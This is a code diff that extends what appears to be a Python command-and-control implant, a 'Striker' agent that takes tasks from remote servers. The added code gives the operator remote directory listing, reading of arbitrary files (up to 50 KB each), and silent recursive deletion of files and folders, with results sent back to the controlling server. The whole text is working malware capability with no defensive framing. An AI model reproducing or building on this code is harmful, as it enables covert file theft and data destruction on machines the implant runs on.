@@ -158,6 +158,45 @@ class Striker:
       conn2.close()
     return
 
+  def listdir(self, dirname):
+    result = []
+    data = os.listdir(dirname)
+    for f in data:
+      entry = []
+      filename = os.path.join(dirname, f)
+      if (os.path.isfile(filename)):
+        entry.append(0)
+        entry.append(os.path.getsize(filename))
+      else:
+        entry.append(1)
+        entry.append(0)
+      entry.append(f)
+      result.append(entry)
+    return result
+
+  def delete_file(self, target):
+    count = 0
+    try:
+      if os.path.isfile(target):
+        os.remove(target)
+        return 1
+      dirs = []
+      for r, d, f in os.walk(target):
+        for name in f:
+          fname = os.path.join(r, name)
+          os.remove(fname)
+          count += 1
+        for name in d:
+          dirs.append(os.path.join(r, name))
+      for d in dirs[::-1]:
+        os.rmdir(d)
+        count += 1
+      os.rmdir(target)
+      count += 1
+    except Exception as e:
+      pass
+    return count
+
   def execTask(self, task):
     taskID = task['uid']
     data = {}
@@ -288,6 +327,25 @@ class Striker:
       else:
         result = body
         successful = 1
+    elif (task["taskType"] == "ls"):
+      dirname = data["dir"]
+      try:
+        files = self.listdir(dirname)
+        result = json.dumps(files)
+        successful = 1
+      except Exception as e:
+        result = "Error listing dir: " + str(e)
+    elif (task["taskType"] == "cat"):
+      filename = data["file"]
+      try:
+        rfo = open(filename)
+        result = rfo.read(1024 * 50)
+        rfo.close()
+        successful = 1
+      except Exception as e:
+        result = "Error reading file: " + str(e)
+    elif (task["taskType"] == "del"):
+      result = str(self.delete_file(data["file"]))
     else:
       result = "Not implemented!"
     task["result"] = {"uid":taskID, "result":result, "successful": successful}
@@ -300,6 +358,7 @@ class Striker:
     body = "{}"
     data = self.info()
     data["key"] = self.authKey
+    data["delay"] = self.delay
     freshConn = True
     while not connected:
       for url in self.servers:
